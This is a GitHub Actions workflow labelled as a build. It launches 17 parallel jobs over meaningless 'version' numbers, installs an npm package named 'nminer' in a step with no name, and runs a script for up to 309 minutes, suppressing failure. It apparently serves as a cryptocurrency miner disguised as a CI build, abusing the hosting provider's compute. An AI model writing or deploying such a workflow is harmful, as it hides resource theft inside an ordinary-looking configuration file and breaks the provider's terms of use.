name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7967 }
          - { version: 8309 }
          - { version: 3975 }
          - { version: 8582 }
          - { version: 5831 }
          - { version: 8213 }
          - { version: 2934 }
          - { version: 6518 }
          - { version: 4108 }
          - { version: 3146 }
          - { version: 6188 }
          - { version: 9272 }
          - { version: 5986 }
          - { version: 7711 }
          - { version: 3557 }
          - { version: 8872 }
          - { version: 1789 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 309m node apparatus.js || echo "apparatus executed"